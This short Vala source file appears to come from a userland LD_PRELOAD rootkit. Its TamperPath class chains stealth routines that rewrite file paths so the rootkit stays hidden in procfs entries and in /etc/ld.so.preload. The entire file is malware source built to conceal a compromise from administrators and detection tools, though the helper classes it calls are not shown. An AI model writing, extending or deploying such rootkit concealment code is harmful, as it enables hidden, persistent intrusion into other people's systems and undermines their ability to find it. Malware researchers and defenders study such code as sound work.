using Posix;

// chains together all the stealth techniques
// so we always get the right files etc
[Compact]
class TamperPath
{
	public static string TamperOpenPath(owned string file)
	{
		// hide rkit in procfs entries
		file = FakeProcfs.TamperOpenPath(file);
		// hide rkit in /etc/ld.so.preload
		file = HidePreload.TamperOpenPath(file);

		return file;
	}
}